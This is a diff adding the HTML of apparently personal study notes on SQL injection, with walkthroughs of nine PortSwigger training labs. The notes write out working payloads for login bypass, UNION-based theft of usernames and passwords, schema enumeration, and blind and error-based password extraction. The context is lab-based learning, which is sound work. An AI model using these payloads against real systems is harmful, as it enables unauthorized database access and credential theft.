+    <span class="md-ellipsis">
+      Identifying the Database
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#information-schema" class="md-nav__link">
+    <span class="md-ellipsis">
+      Information Schema
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sqli_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind SQLi
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind SQLi">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#error-based-sqli_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Error-based SQLi
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Error-based SQLi">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-sqli-by-triggering-conditional-errors" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting blind SQLi by triggering conditional errors
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting blind SQLi by triggering conditional errors">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cast" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cast
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prevention-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prevention Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prevention Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#parameterized-queries" class="md-nav__link">
+    <span class="md-ellipsis">
+      Parameterized Queries
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-in-depth-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense-in-Depth Strategy
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-topics" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Topics
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Topics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#second-order-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Second-Order SQLi
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#out-of-band-oob-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Out-of-Band (OOB) SQLi
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automation-sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Automation (SQLMap)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#other-labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Other Labs
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="sql-injection">SQL Injection<a class="headerlink" href="#sql-injection" title="Permanent link">&para;</a></h1>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p>SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It occurs when user-supplied data is insecurely included in a database query.</p>
+<ul>
+<li>
+<p><strong>Core Vulnerability</strong>: Mixing user <strong>data</strong> with database query <strong>code</strong>.</p>
+</li>
+<li>
+<p><strong>Classic Example</strong>: Bypassing a login form.</p>
+<ul>
+<li>
+<p><strong>Input</strong>: <code>admin' OR '1'='1' --</code></p>
+</li>
+<li>
+<p><strong>Resulting Query</strong>: <code>SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...';</code></p>
+</li>
+<li>
+<p><strong>Effect</strong>: The <code>WHERE</code> clause becomes true for all users, and the password check is ignored (<code>--</code> is a comment), allowing a login bypass.</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="detection-methods">Detection Methods<a class="headerlink" href="#detection-methods" title="Permanent link">&para;</a></h2>
+<p>Methods for discovering SQLi vulnerabilities from the outside.</p>
+<h3 id="error-based-sqli">Error-Based SQLi<a class="headerlink" href="#error-based-sqli" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p><strong>Concept</strong>: Provoking the database to return an error message by injecting special characters (<code>'</code>, <code>"</code>, <code>--</code>).</p>
+</li>
+<li>
+<p><strong>Indicator</strong>: The application returns a verbose database error (e.g., <code>"You have an error in your SQL syntax..."</code>). This confirms the vulnerability and often reveals the database type.</p>
+</li>
+</ul>
+<h3 id="blind-sqli">Blind SQLi<a class="headerlink" href="#blind-sqli" title="Permanent link">&para;</a></h3>
+<p>Used when no errors are returned. The attacker infers information based on the application's behavior.</p>
+<ul>
+<li>
+<p><strong>Boolean-Based Blind SQLi</strong>:</p>
+<ul>
+<li>
+<p><strong>Concept</strong>: Asking the database a series of True/False questions and observing a change in the page content.</p>
+</li>
+<li>
+<p><strong>Example</strong>:</p>
+<ul>
+<li>
+<p><code>... AND '1'='1'</code> → Page loads normally (True).</p>
+</li>
+<li>
+<p><code>... AND '1'='2'</code> → Page returns "not found" or changes (False).</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Result</strong>: The difference in response acts as a "yes/no" signal.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Time-Based Blind SQLi</strong>:</p>
+<ul>
+<li>
+<p><strong>Concept</strong>: Forcing the database to "sleep" or "wait" for a specified time if a condition is true.</p>
+</li>
+<li>
+<p><strong>Example</strong>: <code>... AND IF(1=1, SLEEP(5), 0)</code></p>
+</li>
+<li>
+<p><strong>Result</strong>: If the page takes 5 seconds longer to load, the condition is true. This is a last resort as it is very slow and noisy.</p>
+</li>
+</ul>
+</li>
+</ul>
+<div class="admonition alert">
+<p class="admonition-title">SQL Injection points</p>
+<p>Most SQL injection exists in the <code>WHERE</code> clause of the <code>SELECT</code> statement; however...</p>
+<p>Some other common locations where SQL injection arises are:</p>
+<ul>
+<li>In <code>UPDATE</code> statements, within the updated values or the <code>WHERE</code> clause.</li>
+<li>In <code>INSERT</code> statements, within the inserted values.</li>
+<li>In <code>SELECT</code> statements, within the table or column name.</li>
+<li>In <code>SELECT</code> statements, within the <code>ORDER BY</code> clause.</li>
+</ul>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Caution using <code>OR 1=1</code></p>
+<p>Take care when injecting the condition <code>OR 1=1</code> into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an <code>UPDATE</code> or <code>DELETE</code> statement, for example, it can result in an accidental loss of data.</p>
+</div>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</summary>
+<p><strong>Instructions</strong></p>
+<p>To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p>
+<p><strong>Exploit</strong></p>
+<p>On this shopping site, we can filter by category. For example, when "accessories" is selected, only three items are shown. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803065121.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803065121.png" /></a></p>
+<p>The following request and response show this:</p>
+<div class="highlight"><pre><span></span><code>GET /filter?category=Accessories HTTP/1.1
+Host: 0a8000b80463b54380fff8a8001500cc.web-security-academy.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Connection: keep-alive
+Referer: https://0a8000b80463b54380fff8a8001500cc.web-security-academy.net/filter?category=Tech+gifts
+Cookie: session=xcf9s6nU2m49EDeOXGJhsUF1dYJzO1uK
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+X-PwnFox-Color: magenta
+Priority: u=0, i
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 4789
+
+[...SNIP...]
+</code></pre></div>
+<p>Note the content length of 4789. When a single quote character is added, the server complains. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803065507.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803065507.png" /></a></p>
+<p>Notice that if we add a second single quote, the applications calms down again and doesn't return an internal error. To view unreleased items, I used the following string:</p>
+<div class="highlight"><pre><span></span><code>&#39; AND 1=1-- -
+</code></pre></div>
+<p>This shows the awesome and unreleased six-pack beer belt, which is a fantastic idea...btw!</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803070133.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803070133.png" /></a></p>
+<p>Note that the official solution uses <code>OR 1=1-- -</code>, but this seemed to have worked for me. </p>
+</details>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab 2: SQL injection vulnerability allowing login bypass</summary>
+<p><strong>Instructions</strong></p>
+<p>This lab contains a SQL injection vulnerability in the login function.</p>
+<p>To solve the lab, perform a SQL injection attack that logs in to the application as the <code>administrator</code> user.</p>
+<p>Trying to log in as the administrator with a random password predictably fails.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250804063257.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250804063257.png" /></a></p>
+<p>Closing out the quotes and adding a comment before the password parameter allows us to bypass the authentication mechanism and we can log in as the administrator to solve the lab. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250804063545.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250804063545.png" /></a></p>
+</details>
+<hr />
+<h2 id="exploitation-techniques">Exploitation Techniques<a class="headerlink" href="#exploitation-techniques" title="Permanent link">&para;</a></h2>
+<p>Abusing the vulnerability</p>
+<h3 id="union-based-sqli"><code>UNION</code>-Based SQLi<a class="headerlink" href="#union-based-sqli" title="Permanent link">&para;</a></h3>
+<p><strong>Concept</strong>: The <code>UNION</code> operator combines the results of the application's legitimate query with the results of a malicious query crafted by the attacker.</p>
+<p><strong>Process</strong>:</p>
+<ol>
+<li>
+<p><strong>Find Column Count</strong>: Determine the number of columns in the original query using <code>ORDER BY n--</code> or <code>UNION SELECT NULL,NULL,...--</code>.</p>
+<div class="admonition tip">
+<p class="admonition-title">Null</p>
+<p>Using "NULL" is a good idea because it is convertible to every common data type, so we can use it to figure out columns without having to fight with the database about data types. In some cases, this may cause an error like a NullPointerException, which could make this method ineffective. </p>
+</div>
+</li>
+<li>
+<p><strong>Extract Data</strong>: Craft a <code>UNION SELECT</code> statement to pull data from other tables.</p>
+</li>
+</ol>
+<p><strong>Example Payload</strong>: <code>' UNION SELECT username, password FROM users--</code></p>
+<p>For a <code>UNION</code> query to work, two key requirements must be met:</p>
+<ul>
+<li>The individual queries must return the same number of columns.<ul>
+<li>Figure out how many columns there are.</li>
+</ul>
+</li>
+<li>The data types in each column must be compatible between the individual queries.<ul>
+<li>Which columns returned from the original query are of a suitable data type to host the payload?</li>
+</ul>
+</li>
+</ul>
+<details class="example">
+<summary>PortSwigger SQLi Lab 3: SQL injection UNION attack, determining the number of columns returned by the query</summary>
+<p><strong>Instructions</strong></p>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.</p>
+<p>To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.</p>
+<p>The lab looks like this...with filtering options. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250804065416.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250804065416.png" /></a></p>
+<p>Each row has a "View details" button which brings up the article, as shown below.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250804065607.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250804065607.png" /></a></p>
+<p>Adding a single quote in the category field causes an internal server error, and adding a second fixes the error, so that seems like a good place to start. </p>
+<div class="highlight"><pre><span></span><code>&#39; UNION SELECT null-- -
+</code></pre></div>
+<p>After a little bit of poking, we find that the table has 3 columns. The following payload worked to solve the lab:</p>
+<div class="highlight"><pre><span></span><code>&#39; UNION SELECT null,null,null-- - 
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250804070112.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250804070112.png" /></a></p>
+</details>
+<div class="admonition tip">
+<p class="admonition-title">Tip for Oracle databases</p>
+<p>With Oracle databases, every SELECT statement must use a FROM clause and specify the database. We can use the built-in <code>dual</code> database for this. The query would look like this:</p>
+<div class="highlight"><pre><span></span><code>&#39; UNION SELECT NULL FROM DUAL--
+</code></pre></div>
+</div>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab 4: SQL injection UNION attack, finding a column containing text</summary>
+<p>This lab is very similar to the previous one, but instead of just needing to determine the right number of columns in a table, now we need to figure out which one of those columns contains text. </p>
+<p>The start of the lab is the same. After a little bit of testing, we figure out there are three columns, as shown below:</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250805072620.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250805072620.png" /></a></p>
+<div class="highlight"><pre><span></span><code>&#39; UNION SELECT null,null,null-- -
+</code></pre></div>
+<p>Now we just need to test each of those columns with the data type we're looking for. Since we're trying to find the one that contains text, I just used <code>'a'</code> and looked for what DIDN'T cause an error. </p>
+<p>Here, we can see that the second column works. </p>
+<div class="highlight"><pre><span></span><code>Gifts&#39; UNION SELECT null,&#39;a&#39;,null-- -
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250805072825.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250805072825.png" /></a></p>
+<p>Now we just need to replace the <code>'a'</code> with whatever string the lab wants to print. In this case, it was <code>CtqSX7</code>. So I just dropped that in place of the <code>'a'</code> and solved the lab. </p>
+</details>
+<details class="example">
+<summary>PortSwigger Lab 5: SQL injection UNION attack, retrieving data from other tables</summary>
+<p><strong>Instructions</strong></p>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>.</p>
+<p>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user.</p>
+<p><strong>Exploit</strong></p>
+<p>Given the hint the lab provides, we can start with this payload:</p>
+<div class="highlight"><pre><span></span><code>&#39; UNION SELECT username,password from users-- -
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250806072416.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250806072416.png" /></a></p>
+<p>That works, now we can just log in as the administrator to solve the lab.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250806073140.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250806073140.png" /></a></p>
+</details>
+<p>It's also possible to extract multiple values in a single column with string concatenation. See the <a href="https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/retrieving-multiple-values-within-a-single-column">PortSwigger SQL Injection Cheatsheet</a></p>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab 6: SQL injection UNION attack, retrieving multiple values in a single column</summary>
+<div class="admonition info">
+<p class="admonition-title">Lab instructions</p>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>.</p>
+<p>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user.</p>
+</div>
+<p>We can start this one the same way as the other labs; first, figure out how many columns there are (2), and then figure out which column supports text. I'm using the second column. To figure out what database is in use, I used the <code>version()</code> command, and found that the DB was Postgres, as shown below.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250807203420.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250807203420.png" /></a></p>
+<p>According to the PortSwigger SQLi cheatsheet, the string concatenation operator in Postgres is <code>||</code>. </p>
+<p>So since we know (they gave us the hint) that there is a table named <code>users</code> containing columns <code>username</code> and <code>password</code>, we can extract those with something like <code>username||'~'||password</code>.</p>
+<p>That worked, and we got the administrator password. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250807203938.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250807203938.png" /></a></p>
+<p>Now we can just log in as the administrator to solve the lab.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250807204020.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250807204020.png" /></a></p>
+</details>
+<h3 id="identifying-the-database">Identifying the Database<a class="headerlink" href="#identifying-the-database" title="Permanent link">&para;</a></h3>
+<p>It's probably pretty helpful to know what kind of database you're hacking on, so we'll probably need to figure that out.</p>
+<table>
+<thead>
+<tr>
+<th>Database type</th>
+<th>Query</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft, MySQL</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>SELECT * FROM v$version</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT version()</code></td>
+</tr>
+</tbody>
+</table>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft</summary>
+<div class="admonition info">
+<p class="admonition-title">Lab Instructions</p>
+<p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p>
+<p>To solve the lab, display the database version string.</p>
+</div>
+<p>This is the same style of app...basically a eCommerce site. The required string is shown at the top of the page:</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250807204725.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250807204725.png" /></a></p>
+<p>Start the same way... number of columns &gt; which one supports the correct data type &gt; submit payload &gt; profit. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250807205020.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250807205020.png" /></a></p>
+<p>After we send the <code>@@version</code> string in the second column, we force the DB to print the correct string (its version information) and we solve the lab. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250807205112.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250807205112.png" /></a></p>
+</details>
+<h3 id="information-schema">Information Schema<a class="headerlink" href="#information-schema" title="Permanent link">&para;</a></h3>
+<p>It's possible to extract information about the database from the Information Schema in most databases (except Oracle).</p>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab 8: SQL injection attack, listing the database contents on non-Oracle databases</summary>
+<div class="admonition info">
+<p class="admonition-title">Lab Instructions</p>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</p>
+<p>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user.</p>
+</div>
+<p>Same sort of eCommerce site here as before. </p>
+<p>Since the point off this lab is to extract information from the information schema, I'm going to try this payload first: <code>' UNION SELECT null,schema_name from information_schema.schemata-- -</code></p>
+<p>After sending that, we get the following output:</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250808065135.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250808065135.png" /></a></p>
+<p>I probably could have narrowed that down a bit by appending <code>where schema_name='pg_catalog'</code>, but oh well. Now we need to enumerate the tables. We can use <code>' UNION SELECT null,table_name from information_schema.tables-- -</code> to do that.</p>
+<p>Getting the user table</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250808065528.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250808065528.png" /></a></p>
+<p>So now we can enumerate columns from that table. </p>
+<p>Sending <code>' UNION SELECT null,column_name from information_schema.columns where table_name='users_ihlozl'-- -</code> gives the following results:</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250808065954.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250808065954.png" /></a></p>
+<p>Now that we have the column names we can start trying to extract some data. I used the following query to get the usernames and passwords: <code>' UNION SELECT null,username_ewecsv || ' ' || password_ikgqwk FROM users_ybsfde-- -</code>.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250808183852.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250808183852.png" /></a></p>
+<p>Aaaaand...done.</p>
+</details>
+<h2 id="blind-sqli_1">Blind SQLi<a class="headerlink" href="#blind-sqli_1" title="Permanent link">&para;</a></h2>
+<p>Blind SQLi exists when the application is vulnerable to SQL injection, but we (as the attacker) don't see any responses. Typically this means we'll have to infer the response by triggering certain error responses, time delays, or by finding some kind of oracle to determine the truth of our statements.</p>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab 9: Lab: Blind SQL injection with conditional responses</summary>
+<div class="admonition info">
+<p class="admonition-title">Lab Instructions</p>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
+<p>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a <code>Welcome back</code> message in the page if the query returns any rows.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user</p>
+</div>
+<p>Blind SQLi is an area that has never made a ton of sense to me, so I need to spend a bit of extra time on these. </p>
+<p><strong>Attempting to confirm</strong></p>
+<p>We can use <code>' AND 1=1-- -</code> to try to confirm the vulnerability:</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250810180308.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250810180308.png" /></a></p>
+<p>Now if we use 1=2, we SHOULD get a different result:</p>
+<p>Sure enough, we get no "Welcome back" message</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250810180439.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250810180439.png" /></a></p>
+<p>So now we've confirmed that there is a SQL injection vulnerability in the tracking cookie.</p>
+<p>Now we can start trying to figure out how long the administrator's password is. </p>
+<div class="admonition alert">
+<p class="admonition-title">Skipping a step</p>
+<p>Note that the official solution uses a step to confirm the existence of the <code>administrator</code> user. Since we're given that in the lab instructions, I didn't do that step, but the command they used was:</p>
+<div class="highlight"><pre><span></span><code>TrackingId=xyz&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39;)=&#39;a
+</code></pre></div>
+</div>
+<p>To determine how long the password is, we can use a conditional leveraging the <code>&gt;</code> symbol...basically, the condition is true if the password is longer than N.</p>
+<div class="highlight"><pre><span></span><code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;1)=&#39;a
+</code></pre></div>
+<p>Although it's certainly possible, it's probably unlikely that this password is longer than 30 characters, so I'm starting with that as the top end.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250811182643.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250811182643.png" /></a></p>
+<p>Note the change in content-length between 19 and 20. </p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250811182836.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250811182836.png" /></a></p>
+<p>Since making the argument that the password is greater than 19 characters returns the "Welcome back!" message (implying true), but the argument "&gt; 20" doesn't return the welcome back message (implying false) we can infer that the password is 20 characters long. </p>
+<p>Now that we know how long the password is, we can start trying to figure out what characters belong where. </p>
+<p>Using the following payload we can start enumerating the individual characters.</p>
+<div class="highlight"><pre><span></span><code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND SUBSTRING(password,1,1)=&#39;7&#39;)=&#39;a
+</code></pre></div>
+<p>Note the different content length with <code>7</code>. Looking at the response we see we get the "Welcome back!" message, so we can conclude that the first character of the password is "7". Now we need to automate this a bit to get the rest of the password. </p>
+<p>I ran a matrix scan and found the following password:</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250811190304.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250811190304.png" /></a></p>
+<p>Administrator password:</p>
+<div class="highlight"><pre><span></span><code>7f6u7x9cqygoeigltueb
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250811190429.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250811190429.png" /></a></p>
+<p>Done. </p>
+</details>
+<h3 id="error-based-sqli_1">Error-based SQLi<a class="headerlink" href="#error-based-sqli_1" title="Permanent link">&para;</a></h3>
+<p>This refers to cases where it's possible to use error messages to either view or infer sensitive data. 
+- We might be able to induce the application to return a specific error in response to a boolean expression...basically making this like the previous example. 
+- In some cases, it might be possible to trigger error messages that contain the output of our query. This basically turns a blind SQLi into a visible one.</p>
+<h4 id="exploiting-blind-sqli-by-triggering-conditional-errors">Exploiting blind SQLi by triggering conditional errors<a class="headerlink" href="#exploiting-blind-sqli-by-triggering-conditional-errors" title="Permanent link">&para;</a></h4>
+<p>Some applications' behavior doesn't change when they perform SQL queries; however, it may be possible to get them to return different response based on if a SQL error occurs. </p>
+<p>The following statements illustrate this:</p>
+<div class="highlight"><pre><span></span><code>xyz&#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#39;a&#39; END)=&#39;a
+xyz&#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#39;a&#39; END)=&#39;a
+</code></pre></div>
+<p>We can use this same technique to extract information just like we did in the previous step.</p>
+<div class="highlight"><pre><span></span><code>xyz&#39; AND (SELECT CASE WHEN (Username = &#39;Administrator&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;m&#39;) THEN 1/0 ELSE &#39;a&#39; END FROM Users)=&#39;a
+</code></pre></div>
+<p>So in this case, when the condition is true, we should see a divide-by-zero error of some sort. </p>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab 10: Blind SQL injection with conditional errors</summary>
+<div class="admonition info">
+<p class="admonition-title">Lab Instructions</p>
